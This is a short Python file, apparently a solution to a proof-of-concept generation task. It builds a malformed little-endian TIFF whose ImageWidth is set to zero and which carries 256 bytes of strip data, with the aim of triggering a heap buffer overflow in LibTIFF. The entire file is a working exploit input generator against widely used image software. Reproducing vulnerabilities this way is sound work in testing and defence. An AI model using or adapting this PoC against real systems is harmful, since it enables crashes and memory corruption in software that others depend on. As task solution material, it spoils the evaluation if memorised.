import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow vulnerability in LibTIFF
        related to zero width images.
        """
        # Header: Little Endian (II), Magic 42, Offset 8
        header = b'II\x2a\x00\x08\x00\x00\x00'
        
        # We need to construct the IFD.
        # Required tags for a valid minimal TIFF that reaches the image processing logic:
        # ImageWidth (256), ImageLength (257), BitsPerSample (258), Compression (259)
        # PhotometricInterpretation (262), StripOffsets (273), RowsPerStrip (278)
        # StripByteCounts (279), XResolution (282), YResolution (283), ResolutionUnit (296)
        
        # Vulnerability vector: ImageWidth = 0.
        # This causes allocation of 0 bytes for the raster/scanline buffer,
        # but subsequent logic (if unchecked) may attempt to write data from the strip
        # into this buffer, leading to a Heap Buffer Overflow.
        
        entries = []
        
        def add_entry(tag, type_, count, value):
            entries.append(struct.pack('<HHII', tag, type_, count, value))

        # Define offsets
        # Header (8) + IFD Size
        # IFD Size = 2 (count) + 11*12 (entries) + 4 (next ptr) = 138 bytes
        # IFD End = 8 + 138 = 146
        offset_xres = 146
        offset_yres = 146 + 8
        offset_data = 146 + 16 # 162
        
        data_len = 256 # Amount of data to trigger overflow
        
        # 1. ImageWidth (256) = 0 (TRIGGER)
        add_entry(256, 3, 1, 0)
        # 2. ImageLength (257) = 10
        add_entry(257, 3, 1, 10)
        # 3. BitsPerSample (258) = 8
        add_entry(258, 3, 1, 8)
        # 4. Compression (259) = 1 (None)
        add_entry(259, 3, 1, 1)
        # 5. PhotometricInterpretation (262) = 1 (BlackIsZero)
        add_entry(262, 3, 1, 1)
        # 6. StripOffsets (273)
        add_entry(273, 4, 1, offset_data)
        # 7. RowsPerStrip (278) = 10
        add_entry(278, 3, 1, 10)
        # 8. StripByteCounts (279)
        add_entry(279, 4, 1, data_len)
        # 9. XResolution (282)
        add_entry(282, 5, 1, offset_xres)
        # 10. YResolution (283)
        add_entry(283, 5, 1, offset_yres)
        # 11. ResolutionUnit (296) = 2 (Inch)
        add_entry(296, 3, 1, 2)
        
        # Sort entries by tag ID
        entries.sort(key=lambda x: struct.unpack('<H', x[:2])[0])
        
        # Build IFD
        ifd = struct.pack('<H', len(entries)) + b''.join(entries) + struct.pack('<I', 0)
        
        # Build Data
        xres_data = struct.pack('<II', 72, 1)
        yres_data = struct.pack('<II', 72, 1)
        img_data = b'\xAA' * data_len
        
        poc = header + ifd + xres_data + yres_data + img_data
        
        return poc
